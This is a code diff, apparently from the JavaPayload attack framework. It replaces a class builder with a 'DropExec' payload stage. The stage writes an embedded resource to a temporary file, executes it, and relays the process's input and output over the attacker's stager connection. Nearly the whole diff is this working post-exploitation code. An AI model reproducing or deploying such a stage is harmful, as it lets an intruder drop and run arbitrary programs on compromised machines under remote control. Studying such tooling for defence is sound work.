@@ -32,37 +32,42 @@
  * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
  */
 
-package javapayload.builder;
+package javapayload.stage;
 
-import java.util.StringTokenizer;
+import java.io.DataInputStream;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.InputStream;
+import java.io.OutputStream;
 
-public class EmbeddedClassBuilder {
+public class DropExec implements Stage {
 
-	public static void main(String[] args) throws Exception {
-		if (args.length < 4) {
-			System.out.println("Usage: java javapayload.builder.EmbeddedClassBuilder <classname> <stager> [stageroptions] -- <stage> [stageoptions]");
-			return;
-		}
-		ClassBuilder.buildClass(args[0], args[1], EmbeddedClassBuilder.class, buildEmbeddedArgs(args), args);
-	}
-
-	public static String buildEmbeddedArgs(String[] args) {
-		final StringBuffer embeddedArgs = new StringBuffer();
-		for (int i = 1; i < args.length; i++) {
-			if (i != 1) {
-				embeddedArgs.append("\n");
+	public void start(DataInputStream in, OutputStream out, String[] parameters) throws Exception {
+		final String tempfile = File.createTempFile("~upexec", null).getAbsolutePath();
+		for (int i = 0; i < parameters.length; i++) {
+			if (parameters[i].equals("--")) {
+				// separator found. The next parameter will be the module name, and
+				// all remaining parameters are for exec.
+				final String[] cmdarray = new String[parameters.length - i - 2];
+				System.arraycopy(parameters, i + 2, cmdarray, 0, cmdarray.length);
+				
+				// first parameter is resource name, drop it
+				InputStream resIn = getClass().getResourceAsStream("/"+cmdarray[0]);
+				final FileOutputStream fos = new FileOutputStream(tempfile);
+				StreamForwarder.forward(resIn, fos);
+				
+				// and execute
+				cmdarray[0] = tempfile;
+				final Process proc = Runtime.getRuntime().exec(cmdarray);
+				new StreamForwarder(in, proc.getOutputStream(), out).start();
+				new StreamForwarder(proc.getInputStream(), out, out).start();
+				new StreamForwarder(proc.getErrorStream(), out, out).start();
+				proc.waitFor();
+				in.close();
+				out.close();
+				break;
 			}
-			embeddedArgs.append("$").append(args[i]);
 		}
-		return embeddedArgs.toString();
-	}
-
-	public static void mainToEmbed(String[] args) throws Exception {
-		final StringTokenizer tokenizer = new StringTokenizer("TO_BE_REPLACED", "\n");
-		args = new String[tokenizer.countTokens()];
-		for (int i = 0; i < args.length; i++) {
-			args[i] = tokenizer.nextToken().substring(1);
-		}
-		new ClassBuilder().bootstrap(args);
+		new File(tempfile).delete();
 	}
 }
